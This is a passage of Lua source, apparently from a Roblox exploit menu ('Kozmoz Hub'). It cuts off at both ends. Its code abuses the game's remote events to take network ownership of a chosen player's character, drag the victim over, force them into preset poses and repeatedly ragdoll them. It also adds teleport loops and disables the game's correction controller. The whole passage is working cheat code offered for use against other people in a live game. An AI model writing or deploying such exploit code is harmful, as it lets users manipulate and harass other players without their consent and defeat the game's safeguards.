        if selectedLocation then
            deleteLocation(selectedLocation)
        else
            print("Select a Place to Delete!")
        end
    end
})

_G.tploc = teleportToLocation
_G.saveloc = saveLocation
_G.delloc = deleteLocation

_G.tploop = function(state)
    if state == "ON" or state == "on" then
        if not selectedLocation then
            print("Select a Place First!")
            return
        end
        tpLoopActive = true
        startTPLoop()
    elseif state == "OFF" or state == "off" then
        tpLoopActive = false
        stopTPLoop()
    end
end

_G.locs = function()
    print("Saved Places: ")
    for name, cf in pairs(SavedLocations) do
        local pos = cf.Position
        print("  " .. name .. " -> " .. string.format("%.0f, %.0f, %.0f", pos.X, pos.Y, pos.Z))
    end
end

oldXenoCleanup = getgenv().KozmozLoadingCleanup
getgenv().KozmozLoadingCleanup = function()
    stopTPLoop()
    if oldXenoCleanup then oldXenoCleanup() end
end

getgenv().FigureGrabModule = getgenv().FigureGrabModule or {}
local FGM = getgenv().FigureGrabModule

FGM.Players = game:GetService("Players")
FGM.RunService = game:GetService("RunService")
FGM.ReplicatedStorage = game:GetService("ReplicatedStorage")
FGM.UserInputService = game:GetService("UserInputService")

FGM.LocalPlayer = FGM.Players.LocalPlayer
FGM.Mouse = FGM.LocalPlayer:GetMouse()

FGM.GrabEvents = FGM.ReplicatedStorage:WaitForChild("GrabEvents")
FGM.SetNetworkOwner = FGM.GrabEvents:WaitForChild("SetNetworkOwner")
FGM.DestroyLine = FGM.GrabEvents:WaitForChild("DestroyGrabLine")
FGM.CreateLine = FGM.GrabEvents:WaitForChild("CreateGrabLine")

FGM.MenuToys = FGM.ReplicatedStorage:WaitForChild("MenuToys")
FGM.ToySpawn = FGM.MenuToys:WaitForChild("SpawnToyRemoteFunction")
FGM.DestroyToy = FGM.MenuToys:WaitForChild("DestroyToy")

FGM.State = {
    FigureGrabEnabled = false,
    FigureGrabConnection = nil,
    TargetCharacter = nil,
    SelectedTarget = nil,
    AnimationCopyEnabled = false,
    VectorZero = Vector3.new(0, 0, 0),
    AutoRagdollToggle = false,
    AutoRagdollEnabled = false,
    AutoRagdollConnection = nil,
    RagdollPallet = nil,
    RagdollSoundPart = nil,
    SeveralEnabled = false,
    SeveralTargets = {},
    LastTargetUserId = nil,
    LastTargetHRP = nil,
    TargetDropdown = nil,
    SavedPosition = nil,
    IsReturning = false
}

FGM.Configuration = {
    LineDistance = 0,
    HoldPosition = {X = 0, Y = 0, Z = -5},
    HoldRotation = {X = 0, Y = 0, Z = 0},
    LeftArmPosition = {X = 0, Y = 0, Z = 0},
    LeftArmRotation = {X = 0, Y = 0, Z = 0},
    RightArmPosition = {X = 0, Y = 0, Z = 0},
    RightArmRotation = {X = 0, Y = 0, Z = 0},
    LeftLegPosition = {X = 0, Y = 0, Z = 0},
    LeftLegRotation = {X = 0, Y = 0, Z = 0},
    RightLegPosition = {X = 0, Y = 0, Z = 0},
    RightLegRotation = {X = 0, Y = 0, Z = 0},
    HeadPosition = {X = 0, Y = 0, Z = 0},
    HeadRotation = {X = 0, Y = 0, Z = 0}
}

FGM.Presets = {
    Pose1 = {HoldPosition={X=0,Y=0,Z=-7.5},HoldRotation={X=90,Y=0,Z=108},LeftArmPosition={X=-1.5,Y=1,Z=-1},LeftArmRotation={X=283,Y=0,Z=0},RightArmPosition={X=1.5,Y=0.5,Z=1},RightArmRotation={X=270,Y=0,Z=0},LeftLegPosition={X=0.5,Y=-1.5,Z=0.5},LeftLegRotation={X=312,Y=0,Z=0},RightLegPosition={X=-0.5,Y=-1.5,Z=0.5},RightLegRotation={X=283,Y=0,Z=0},HeadPosition={X=0,Y=1.5,Z=0},HeadRotation={X=0,Y=0,Z=0}},
    Pose2 = {HoldPosition={X=0,Y=-1.5,Z=-12.5},HoldRotation={X=272,Y=0,Z=0},LeftArmPosition={X=-1,Y=1,Z=-0.5},LeftArmRotation={X=90,Y=0,Z=0},RightArmPosition={X=1,Y=1,Z=-0.5},RightArmRotation={X=90,Y=0,Z=0},LeftLegPosition={X=1,Y=-1,Z=-0.5},LeftLegRotation={X=90,Y=0,Z=0},RightLegPosition={X=-1,Y=-1,Z=-0.5},RightLegRotation={X=90,Y=0,Z=0},HeadPosition={X=0,Y=1,Z=1},HeadRotation={X=90,Y=0,Z=0}},
    Pose3 = {HoldPosition={X=0,Y=-5.5,Z=-4},HoldRotation={X=0,Y=0,Z=0},LeftArmPosition={X=1,Y=7.5,Z=1.5},LeftArmRotation={X=0,Y=0,Z=0},RightArmPosition={X=1,Y=6,Z=1.5},RightArmRotation={X=0,Y=0,Z=0},LeftLegPosition={X=0.5,Y=5,Z=1.5},LeftLegRotation={X=0,Y=0,Z=92},RightLegPosition={X=-0.5,Y=5,Z=1.5},RightLegRotation={X=0,Y=0,Z=90},HeadPosition={X=0,Y=0,Z=0},HeadRotation={X=0,Y=0,Z=0}},
    Pose4 = {HoldPosition={X=1.5,Y=-8.5,Z=-1.5},HoldRotation={X=0,Y=0,Z=0},LeftArmPosition={X=0,Y=0,Z=0},LeftArmRotation={X=0,Y=0,Z=0},RightArmPosition={X=0,Y=0,Z=0},RightArmRotation={X=0,Y=0,Z=0},LeftLegPosition={X=0,Y=0,Z=0},LeftLegRotation={X=0,Y=0,Z=0},RightLegPosition={X=1.5,Y=0,Z=0},RightLegRotation={X=0,Y=0,Z=0},HeadPosition={X=0,Y=9,Z=0},HeadRotation={X=0,Y=0,Z=0}},
    Pose5 = {HoldPosition={X=0,Y=-3,Z=-6},HoldRotation={X=270,Y=0,Z=0},LeftArmPosition={X=-1,Y=0.5,Z=0},LeftArmRotation={X=180,Y=0,Z=0},RightArmPosition={X=1,Y=0.5,Z=0},RightArmRotation={X=180,Y=0,Z=0},LeftLegPosition={X=0,Y=-3,Z=0},LeftLegRotation={X=0,Y=0,Z=0},RightLegPosition={X=0,Y=-2,Z=0.5},RightLegRotation={X=45,Y=0,Z=0},HeadPosition={X=0,Y=1.5,Z=-0.5},HeadRotation={X=270,Y=0,Z=0}},
    Pose6 = {HoldPosition={X=5.5,Y=0.5,Z=-1.5},HoldRotation={X=345,Y=39,Z=0},LeftArmPosition={X=2,Y=0.5,Z=0},LeftArmRotation={X=0,Y=43,Z=121},RightArmPosition={X=-2,Y=0,Z=0},RightArmRotation={X=64,Y=112,Z=0},LeftLegPosition={X=-0.5,Y=-2,Z=0},LeftLegRotation={X=349,Y=0,Z=360},RightLegPosition={X=0.5,Y=-2,Z=0},RightLegRotation={X=345,Y=360,Z=10},HeadPosition={X=0,Y=1.5,Z=0},HeadRotation={X=0,Y=344,Z=0}},
    Pose7 = {HoldPosition={X=0,Y=-2,Z=-10},HoldRotation={X=90,Y=0,Z=0},LeftArmPosition={X=-1.5,Y=0,Z=0},LeftArmRotation={X=270,Y=0,Z=315},RightArmPosition={X=1.5,Y=0,Z=0},RightArmRotation={X=270,Y=0,Z=45},LeftLegPosition={X=-1,Y=-1.5,Z=0},LeftLegRotation={X=90,Y=0,Z=0},RightLegPosition={X=1,Y=-1.5,Z=0},RightLegRotation={X=90,Y=0,Z=0},HeadPosition={X=0,Y=1.5,Z=0},HeadRotation={X=0,Y=0,Z=0}},
    JojoStand = {HoldPosition={X=-4.5,Y=0.5,Z=-1.5},HoldRotation={X=8,Y=349,Z=0},LeftArmPosition={X=1.5,Y=0,Z=0},LeftArmRotation={X=15,Y=62,Z=41},RightArmPosition={X=-1.5,Y=0.5,Z=-0.5},RightArmRotation={X=65,Y=149,Z=6},LeftLegPosition={X=-0.5,Y=-2,Z=0},LeftLegRotation={X=349,Y=0,Z=360},RightLegPosition={X=0.5,Y=-2,Z=0},RightLegRotation={X=345,Y=360,Z=10},HeadPosition={X=0,Y=1.5,Z=0},HeadRotation={X=0,Y=344,Z=0}}
}

function FGM.GetCharacter(player)
    local character = player.Character
    if not character and player.CharacterAdded then
        character = player.CharacterAdded:Wait()
    end
    return character
end

function FGM.CopyAnimationsFromLimbs()
    if not FGM.State.AnimationCopyEnabled or not FGM.State.TargetCharacter then return end
    local MyCharacter = FGM.GetCharacter(FGM.LocalPlayer)
    if not MyCharacter then return end
    local MyHRP = MyCharacter:FindFirstChild("HumanoidRootPart")
    local MyTorso = MyCharacter:FindFirstChild("Torso")
    local TargetTorso = FGM.State.TargetCharacter:FindFirstChild("Torso")
    if not MyHRP or not MyTorso or not TargetTorso then return end
    local holdCFrame = MyHRP.CFrame * CFrame.new(
        FGM.Configuration.HoldPosition.X, FGM.Configuration.HoldPosition.Y, FGM.Configuration.HoldPosition.Z
    ) * CFrame.Angles(
        math.rad(FGM.Configuration.HoldRotation.X), math.rad(FGM.Configuration.HoldRotation.Y), math.rad(FGM.Configuration.HoldRotation.Z)
    )
    TargetTorso.CFrame = holdCFrame
    local torsoRelative = MyHRP.CFrame:ToObjectSpace(MyTorso.CFrame)
    TargetTorso.CFrame = TargetTorso.CFrame * torsoRelative.Rotation
    TargetTorso.Velocity = FGM.State.VectorZero
    TargetTorso.RotVelocity = FGM.State.VectorZero
    local limbs = {"Head", "Right Arm", "Left Arm", "Right Leg", "Left Leg"}
    for _, limbName in ipairs(limbs) do
        local myPart = MyCharacter:FindFirstChild(limbName)
        local targetPart = FGM.State.TargetCharacter:FindFirstChild(limbName)
        if myPart and targetPart then
            local relative = MyTorso.CFrame:ToObjectSpace(myPart.CFrame)
            targetPart.CFrame = TargetTorso.CFrame:ToWorldSpace(relative)
            targetPart.Velocity = FGM.State.VectorZero
            targetPart.RotVelocity = FGM.State.VectorZero
        end
    end
end

function FGM.ToggleAutoRagdoll(enabled)
    FGM.State.AutoRagdollEnabled = enabled
    if FGM.State.AutoRagdollConnection then
        FGM.State.AutoRagdollConnection:Disconnect()
        FGM.State.AutoRagdollConnection = nil
    end
    if not enabled then
        if FGM.State.RagdollPallet then
            pcall(function() FGM.DestroyToy:FireServer(FGM.State.RagdollPallet) end)
        end
        FGM.State.RagdollPallet = nil
        FGM.State.RagdollSoundPart = nil
        return
    end
    task.spawn(function()
        local myChar = FGM.LocalPlayer.Character
        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHRP then return end
        FGM.MyToys = workspace:FindFirstChild(FGM.LocalPlayer.Name .. "SpawnedInToys")
        if not FGM.MyToys then return end
        local pallet = FGM.MyToys:FindFirstChild("RagdollPallet") or FGM.MyToys:FindFirstChild("PalletLightBrown")
        if not pallet then
            FGM.ToySpawn:InvokeServer("PalletLightBrown", myHRP.CFrame * CFrame.new(5, 5, 20), Vector3.new(0, 0, 0))
            local t = tick() + 5
            repeat task.wait(0.05) until FGM.MyToys:FindFirstChild("PalletLightBrown") or tick() > t
            pallet = FGM.MyToys:FindFirstChild("PalletLightBrown")
        end
        if not pallet then return end
        pallet.Name = "RagdollPallet"
        local soundPart = pallet:WaitForChild("SoundPart", 5)
        if not soundPart then return end
        local t2 = tick() + 3
        repeat
            FGM.SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
            task.wait()
        until soundPart:FindFirstChild("PartOwner") or tick() > t2
        soundPart.AssemblyLinearVelocity = Vector3.new(0, 10000, 0)
        for _, v in pairs(pallet:GetDescendants()) do
            if v:IsA("BasePart") then v.Transparency = 1 v.CanCollide = false end
        end
        FGM.State.RagdollPallet = pallet
        FGM.State.RagdollSoundPart = soundPart
        FGM.State.AutoRagdollConnection = FGM.RunService.Heartbeat:Connect(function()
            if not FGM.State.AutoRagdollEnabled then return end
            local sp = FGM.State.RagdollSoundPart
            if not sp or not sp.Parent then
                if FGM.State.AutoRagdollConnection then
                    FGM.State.AutoRagdollConnection:Disconnect()
                    FGM.State.AutoRagdollConnection = nil
                end
                FGM.State.RagdollPallet = nil
                FGM.State.RagdollSoundPart = nil
                return
            end
            local targets = {}
            if FGM.State.FigureGrabEnabled and FGM.State.TargetCharacter then
                table.insert(targets, FGM.State.TargetCharacter)
            end
            if FGM.State.SeveralEnabled then
                for _, e in ipairs(FGM.State.SeveralTargets) do table.insert(targets, e.char) end
            end
            for _, targetChar in ipairs(targets) do
                local hrp = targetChar:FindFirstChild("HumanoidRootPart")
                local hum = targetChar:FindFirstChild("Humanoid")
                if hrp and hum then
                    local ragdolled = hum:FindFirstChild("Ragdolled")
                    if ragdolled and ragdolled.Value == false then
                        task.spawn(function()
                            sp.AssemblyLinearVelocity = Vector3.new(0, 100, 0)
                            sp.CFrame = hrp.CFrame
                            task.wait(0.05)
                            if sp and sp.Parent then sp.CFrame = CFrame.new(0, 1e9, 0) end
                        end)
                    end
                end
            end
        end)
    end)
end

function FGM.BringTargetToMe(target)
    if not target then return false end
    local myChar = FGM.LocalPlayer.Character
    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return false end
    local savedPos = myRoot.CFrame
    if not target.Character then return false end
    local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
    local tHum = target.Character:FindFirstChild("Humanoid")
    if not tRoot or not tHum then return false end
    myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 2.5)
    myRoot.AssemblyLinearVelocity = Vector3.zero
    task.wait(0.05)
    for i = 1, 8 do
        pcall(function() FGM.SetNetworkOwner:FireServer(tRoot, tRoot.CFrame) end)
        task.wait(0.01)
    end
    for i = 1, 4 do
        pcall(function() FGM.DestroyLine:FireServer(tRoot) end)
        task.wait(0.01)
    end
    tRoot.CFrame = savedPos * CFrame.new(0, 0, 2)
    tRoot.AssemblyLinearVelocity = Vector3.zero
    pcall(function() tHum.PlatformStand = true end)
    task.wait(0.05)
    myRoot.CFrame = savedPos
    myRoot.AssemblyLinearVelocity = Vector3.zero
    return true
end

function FGM.JumpAndReturn()
    local myChar = FGM.LocalPlayer.Character
    local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myHRP then return end
    FGM.State.IsReturning = true
    if FGM.State.SavedPosition then
        myHRP.CFrame = FGM.State.SavedPosition
        myHRP.Velocity = Vector3.zero
        myHRP.AssemblyAngularVelocity = Vector3.zero
    end
    FGM.State.IsReturning = false
end

function FGM.ToggleFigureGrab()
    if not FGM.State.FigureGrabEnabled then
        local tn = FGM.State.SelectedTarget
        if not tn or tn == "" then
            return
        end
        local target = FGM.Players:FindFirstChild(tn)
        if not target then
            return
        end
        local myChar = FGM.GetCharacter(FGM.LocalPlayer)
        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHRP then
            return
        end
        FGM.State.SavedPosition = myHRP.CFrame
        local bringSuccess = FGM.BringTargetToMe(target)
        if not bringSuccess then
            return
        end
        task.wait(0.2)
        FGM.State.TargetCharacter = target.Character
        local MyCharacter = FGM.GetCharacter(FGM.LocalPlayer)
        if not FGM.State.TargetCharacter or not MyCharacter then
            return
        end
        local BodyParts = {"Head", "Left Arm", "Right Arm", "Left Leg", "Right Leg"}
        local TargetTorso = FGM.State.TargetCharacter:FindFirstChild("Torso")
        if not TargetTorso then
            return
        end
        for _, partName in pairs(BodyParts) do
            local part = FGM.State.TargetCharacter:FindFirstChild(partName)
            if part then
                part.Anchored = false
                part.CanCollide = true
                part.Massless = true
            end
        end
        FGM.State.FigureGrabEnabled = true
        FGM.Configuration.LineDistance = 5
        FGM.State.LastTargetUserId = target.UserId
        FGM.State.LastTargetHRP = FGM.State.TargetCharacter:FindFirstChild("HumanoidRootPart")
        if FGM.State.FigureGrabConnection then
            FGM.State.FigureGrabConnection:Disconnect()
        end
        FGM.State.FigureGrabConnection = FGM.RunService.Heartbeat:Connect(function()
            if not FGM.State.FigureGrabEnabled then return end
            local currentTarget = FGM.Players:FindFirstChild(tn)
            if not currentTarget or not currentTarget.Parent then
                FGM.State.FigureGrabEnabled = false
                if FGM.State.FigureGrabConnection then
                    FGM.State.FigureGrabConnection:Disconnect()
                    FGM.State.FigureGrabConnection = nil
                end
                return
            end
            local currentChar = currentTarget.Character
            if not currentChar then
                task.wait(0.1)
                return
            end
            local currentHRP = currentChar:FindFirstChild("HumanoidRootPart")
            if not currentHRP then return end
            if FGM.State.LastTargetUserId and FGM.State.LastTargetUserId ~= currentTarget.UserId then
                FGM.State.LastTargetUserId = currentTarget.UserId
                FGM.State.LastTargetHRP = currentHRP
                FGM.State.TargetCharacter = currentChar
                TargetTorso = currentChar:FindFirstChild("Torso")
                FGM.BringTargetToMe(currentTarget)
                task.wait(0.3)
                return
            end
            if not FGM.State.TargetCharacter or not MyCharacter then
                FGM.State.FigureGrabEnabled = false
                if FGM.State.FigureGrabConnection then
                    FGM.State.FigureGrabConnection:Disconnect()
                end
                return
            end
            local MyRoot = MyCharacter:FindFirstChild("HumanoidRootPart")
            if not MyRoot then return end
            if currentHRP then
                local dist = (MyRoot.Position - currentHRP.Position).Magnitude
                if dist > 30 then
                    FGM.BringTargetToMe(currentTarget)
                    task.wait(0.2)
                    return
                end
            end
            local holdCFrame = MyRoot.CFrame * CFrame.new(
                FGM.Configuration.HoldPosition.X,
                FGM.Configuration.HoldPosition.Y,
                FGM.Configuration.HoldPosition.Z
            )
            TargetTorso = FGM.State.TargetCharacter:FindFirstChild("Torso")
            if not TargetTorso then return end
            TargetTorso.CFrame = holdCFrame * CFrame.Angles(
                math.rad(FGM.Configuration.HoldRotation.X),
                math.rad(FGM.Configuration.HoldRotation.Y),
                math.rad(FGM.Configuration.HoldRotation.Z)
            )
            TargetTorso.Velocity = FGM.State.VectorZero
            TargetTorso.RotVelocity = FGM.State.VectorZero
            if FGM.State.AnimationCopyEnabled then
                FGM.CopyAnimationsFromLimbs()
            else
                for _, partName in pairs(BodyParts) do
                    local part = FGM.State.TargetCharacter:FindFirstChild(partName)
                    if part and part ~= TargetTorso then
                        local posKey = string.gsub(partName, " ", "") .. "Position"
                        local rotKey = string.gsub(partName, " ", "") .. "Rotation"
                        if FGM.Configuration[posKey] and FGM.Configuration[rotKey] then
                            part.CFrame = TargetTorso.CFrame * CFrame.new(
                                FGM.Configuration[posKey].X, FGM.Configuration[posKey].Y, FGM.Configuration[posKey].Z
                            ) * CFrame.Angles(
                                math.rad(FGM.Configuration[rotKey].X), math.rad(FGM.Configuration[rotKey].Y), math.rad(FGM.Configuration[rotKey].Z)
                            )
                            part.Velocity = FGM.State.VectorZero
                            part.RotVelocity = FGM.State.VectorZero
                        end
                    end
                end
            end
            FGM.SetNetworkOwner:FireServer(TargetTorso, holdCFrame)
        end)
        if FGM.State.AutoRagdollToggle then
            FGM.ToggleAutoRagdoll(true)
        end
    else
        FGM.JumpAndReturn()
        FGM.State.FigureGrabEnabled = false
        FGM.State.AnimationCopyEnabled = false
        FGM.State.LastTargetUserId = nil
        FGM.State.LastTargetHRP = nil
        if FGM.State.FigureGrabConnection then
            FGM.State.FigureGrabConnection:Disconnect()
            FGM.State.FigureGrabConnection = nil
        end
        FGM.ToggleAutoRagdoll(false)
    end
end

function FGM.ResetPose()
    for section, values in pairs(FGM.Configuration) do
        if typeof(values) == "table" then
            for axis, _ in pairs(values) do
                values[axis] = 0
            end
        end
    end
end

function FGM.ApplyPreset(presetName)
    preset = FGM.Presets[presetName]
    if preset then
        for section, values in pairs(preset) do
            if FGM.Configuration[section] then
                for axis, value in pairs(values) do
                    FGM.Configuration[section][axis] = value
                end
            end
        end
    end
end

function FGM.UpdateConfig(section, axis, value)
    if FGM.Configuration[section] and FGM.Configuration[section][axis] ~= nil then
        FGM.Configuration[section][axis] = value
    end
end

local FigureMain = Tabs.FigureTab:AddLeftGroupbox('Figure Grab Main')
local FigurePoses = Tabs.FigureTab:AddRightGroupbox('Figure Poses')
local FigureOffsets = Tabs.FigureTab:AddRightGroupbox('Limb Offsets')

local function FG_GetPlayerList()
    local list = {}
    for _, p in ipairs(FGM.Players:GetPlayers()) do
        if p ~= FGM.LocalPlayer then
            table.insert(list, p.DisplayName .. " (@" .. p.Name .. ")")
        end
    end
    table.sort(list)
    return list
end

local function FG_GetUsernameFromFormatted(fmt)
    return fmt:match("%(@(.+)%)") or fmt
end

FGM.State.TargetDropdown = FigureMain:AddDropdown("FG_TargetPlayer", {
    Text = "Select Target",
    Values = FG_GetPlayerList(),
    Default = 1,
    Callback = function(Value)
        FGM.State.SelectedTarget = FG_GetUsernameFromFormatted(Value)
    end
})

FGM.Players.PlayerAdded:Connect(function()
    task.wait(0.5)
    if FGM.State.TargetDropdown then
        pcall(function() FGM.State.TargetDropdown:SetValues(FG_GetPlayerList()) end)
    end
end)

FGM.Players.PlayerRemoving:Connect(function()
    task.wait(0.3)
    if FGM.State.TargetDropdown then
        pcall(function() FGM.State.TargetDropdown:SetValues(FG_GetPlayerList()) end)
    end
end)

FigureMain:AddButton({
    Text = "Refresh Target List",
    Func = function()
        if FGM.State.TargetDropdown then
            pcall(function() FGM.State.TargetDropdown:SetValues(FG_GetPlayerList()) end)
        end
    end
})

FigureMain:AddDivider()

FigureMain:AddToggle('FG_EnableToggle', {
    Text = 'Enable Figure Grab',
    Default = false,
    Tooltip = 'kinda buggy (soon fixed)',
    Callback = function(Value)
        if Value then
            if not FGM.State.SelectedTarget or FGM.State.SelectedTarget == "" then
                pcall(function() Toggles.FG_EnableToggle:SetValue(false) end)
                return
            end
            FGM.ToggleFigureGrab()
        else
            if FGM.State.FigureGrabEnabled then
                FGM.ToggleFigureGrab()
            end
        end
    end,
})

FigureMain:AddToggle('FG_AutoRagdollToggle', {
    Text = 'Auto Ragdoll Target',
    Default = false,
    Tooltip = 'Automatically ragdolls the grabbed target using pallet hammer',
    Callback = function(Value)
        FGM.State.AutoRagdollToggle = Value
        if FGM.State.FigureGrabEnabled then
            FGM.ToggleAutoRagdoll(Value)
        end
    end,
})

FigureMain:AddToggle('FG_AnimCopyToggle', {
    Text = 'Copy My Animations to Target',
    Default = false,
    Tooltip = 'Copies your current animation pose to the target',
    Callback = function(Value)
        FGM.State.AnimationCopyEnabled = Value
        if Value then
        else
        end
    end,
})

FigurePoses:AddButton('Reset Pose', function() FGM.ResetPose() end)
FigurePoses:AddButton('Pose 1 Jesus', function() FGM.ApplyPreset("Pose1") end)
FigurePoses:AddButton('Pose 2 Dog', function() FGM.ApplyPreset("Pose2") end)
FigurePoses:AddButton('Pose 3 L', function() FGM.ApplyPreset("Pose3") end)
FigurePoses:AddButton('Pose 4 Head Hold', function() FGM.ApplyPreset("Pose4") end)
FigurePoses:AddButton('Pose 5 Handstand', function() FGM.ApplyPreset("Pose5") end)
FigurePoses:AddButton('Pose 6 Stand 1', function() FGM.ApplyPreset("Pose6") end)
FigurePoses:AddButton('Pose 7 T-Pose', function() FGM.ApplyPreset("Pose7") end)
FigurePoses:AddButton('Pose 8 Stand 2', function() FGM.ApplyPreset("JojoStand") end)

local function CreateLimbSliders(limbName, configKey)
    for _, axis in ipairs({"X", "Y", "Z"}) do
        FigureOffsets:AddSlider('FG_' .. configKey .. 'Pos' .. axis, {
            Text = limbName .. ' Pos ' .. axis,
            Min = -50, Max = 50, Default = 0, Rounding = 1,
            Callback = function(value) FGM.UpdateConfig(configKey .. "Position", axis, value) end
        })
        FigureOffsets:AddSlider('FG_' .. configKey .. 'Rot' .. axis, {
            Text = limbName .. ' Rot ' .. axis,
            Min = 0, Max = 360, Default = 0, Rounding = 0,
            Callback = function(value) FGM.UpdateConfig(configKey .. "Rotation", axis, value) end
        })
    end
end

CreateLimbSliders("Left Arm", "LeftArm")
CreateLimbSliders("Right Arm", "RightArm")
CreateLimbSliders("Left Leg", "LeftLeg")
CreateLimbSliders("Right Leg", "RightLeg")
CreateLimbSliders("Head", "Head")
CreateLimbSliders("Hold", "Hold")

UISettingsLeft = Tabs.UiTab:AddLeftGroupbox("Menu")
UISettingsRight = Tabs.UiTab:AddRightGroupbox("Config")

UISettingsLeft:AddToggle("KeybindMenuOpen", {
    Text = "Open Keybind Menu",
    Default = Library.KeybindFrame.Visible,
    Callback = function(value)
        Library.KeybindFrame.Visible = value
    end,
})

UISettingsLeft:AddToggle("ShowCustomCursor", {
    Text = "Custom Cursor",
    Default = true,
    Callback = function(Value)
        Library.ShowCustomCursor = Value
    end,
})

UISettingsLeft:AddDropdown("NotificationSide", {
    Values = { "Left", "Right" },
    Default = "Right",
    Text = "Notification Side",
    Callback = function(Value)
        Library:SetNotifySide(Value)
    end,
})

UISettingsLeft:AddDropdown("DPIDropdown", {
    Values = { "50%", "75%", "100%", "125%", "150%", "175%", "200%" },
    Default = "100%",
    Text = "DPI Scale",
    Callback = function(Value)
        Value = Value:gsub("%%", "")
        DPI = tonumber(Value)
        Library:SetDPIScale(DPI)
    end,
})

UISettingsLeft:AddDivider()

UISettingsLeft:AddLabel("Menu bind")
    :AddKeyPicker("MenuKeybind", { Default = "M", NoUI = true, Text = "Menu keybind" })

Library.ToggleKeybind = Options.MenuKeybind

UISettingsLeft:AddButton({
    Text = "Unload",
    Func = function()
        Library:Unload()
    end,
})

UISettingsRight:AddButton({
    Text = "Save Config",
    Func = function()
        configData = {}
        for name, value in pairs(PersistentToggles) do
            configData[name] = value
        end
        print("Kozmoz Hub - Config Saved!")
    end,
})

UISettingsRight:AddButton({
    Text = "Load Config",
    Func = function()
        RestoreToggles()
        task.spawn(function()
            task.wait(2) 
            if Toggles.GucciBlobman and Toggles.GucciBlobman.Value then
                GucciToggleActive = true
                if not isSpawningGucci then
                    SetupGucciAntiGrab()
                end
            end
        end)
    end,
})

UISettingsRight:AddButton({
    Text = "Reset All Toggles",
    Func = function()
        for name, toggle in pairs(Toggles) do
            pcall(function()
                toggle:SetValue(false)
            end)
        end
    end,
})

ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ "MenuKeybind" })

ThemeManager:SetFolder("Kozmoz Hub")
SaveManager:SetFolder("Kozmoz Hub")

SaveManager:BuildConfigSection(Tabs.UiTab)
ThemeManager:ApplyToTab(Tabs.UiTab)

SaveManager:LoadAutoloadConfig()

-- [KOZMOZ] Vurgu rengi, kayitli temadan bagimsiz olarak hep #ffa100 (PNG3)
do
    local kozAccent = Color3.fromRGB(255, 160, 0)
    Library.Scheme.AccentColor = kozAccent
    Library.Scheme.ButtonCornerColor = kozAccent
    task.defer(function()
        task.wait(0.35)
        Library.Scheme.AccentColor = kozAccent
        pcall(function()
            Library:UpdateColorsUsingRegistry()
        end)
    end)
end


task.spawn(function()
    task.wait(4.5)
    local gucciToggles = {"GucciBlobman", "GucciTractor", "GucciTrainToggle"}
    for _, toggleName in ipairs(gucciToggles) do
        if Toggles[toggleName] and Toggles[toggleName].Value then
            Toggles[toggleName]:SetValue(false)
            task.wait()
            Toggles[toggleName]:SetValue(true)
        end
    end
end)

activepackets=false
if rs.GrabEvents and rs.GrabEvents.ExtendGrabLine then
    rs.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(player,args)
        if typeof(args)=="string" and string.len(args)>300 and not activepackets then
            activepackets=true
            task.wait(4)
            activepackets=false
        end
    end)
end

for i,v in Players:GetPlayers() do
    if v ~= plr then
        if v.Character and v.Character.Humanoid and v.Character.Humanoid.SeatPart then Seats[v.Name] = v.Character.Humanoid.SeatPart end
        v.CharacterAdded:Connect(function(c)
            c:WaitForChild("Humanoid"):GetPropertyChangedSignal("SeatPart"):Connect(function()
                seat = c.Humanoid.SeatPart
                if not seat then return end
                Seats[v.Name] = seat
            end)
        end)
        if v.Character then
            v.Character.Humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
                seat = v.Character.Humanoid.SeatPart
                if not seat then return end
                Seats[v.Name] = seat
            end)
        end
    end
end

task.spawn(function()
    while task.wait(0.1) do
        if HRP and HRP.Parent then
            HRP.Massless = false
        end
    end
end)

Players.PlayerAdded:Connect(function(p)
    if p ~= plr then
        p.CharacterAdded:Connect(function(c)
            c:WaitForChild("Humanoid"):GetPropertyChangedSignal("SeatPart"):Connect(function()
                seat = c.Humanoid.SeatPart
                if not seat then return end
                Seats[p.Name] = seat
            end)
        end)
        if p.Character then
            p.Character.Humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
                seat = p.Character.Humanoid.SeatPart
                if not seat then return end
                Seats[p.Name] = seat
            end)
        end
    end
end)

for i,v in Players:GetPlayers() do
    if v ~= plr then
        if v.Character and v.Character.Humanoid and v.Character.Humanoid.SeatPart then Seats[v.Name] = v.Character.Humanoid.SeatPart end
        v.CharacterAdded:Connect(function(c)
            task.wait(1)
            if c:FindFirstChild("HumanoidRootPart") then
                c.HumanoidRootPart:GetPropertyChangedSignal("Massless"):Connect(function()
                    if c.HumanoidRootPart.Massless == true then
                        c.HumanoidRootPart.Massless = false
                    end
                end)
            end
        end)
        if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
            v.Character.HumanoidRootPart:GetPropertyChangedSignal("Massless"):Connect(function()
                if v.Character.HumanoidRootPart.Massless == true then
                    v.Character.HumanoidRootPart.Massless = false
                end
            end)
        end
    end
end

Players.PlayerAdded:Connect(function(p)
    if p ~= plr then
        p.CharacterAdded:Connect(function(c)
            task.wait(1)
            if c:FindFirstChild("HumanoidRootPart") then
                c.HumanoidRootPart:GetPropertyChangedSignal("Massless"):Connect(function()
                    if c.HumanoidRootPart.Massless == true then
                        c.HumanoidRootPart.Massless = false
                    end
                end)
            end
        end)
        if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            p.Character.HumanoidRootPart:GetPropertyChangedSignal("Massless"):Connect(function()
                if p.Character.HumanoidRootPart.Massless == true then
                    p.Character.HumanoidRootPart.Massless = false
                end
            end)
        end
    end
end)

pcall(function()
    p = game:GetService("Players").LocalPlayer
    if p and p.PlayerGui then
        gcg = p.PlayerGui:FindFirstChild("GameCorrectionsGui")
        if gcg then
            ctrl = gcg:FindFirstChild("GameCorrectionsUiController")
            if ctrl then
                ctrl.Enabled = false
            end
        end
    end
end)

local function witheringheights()
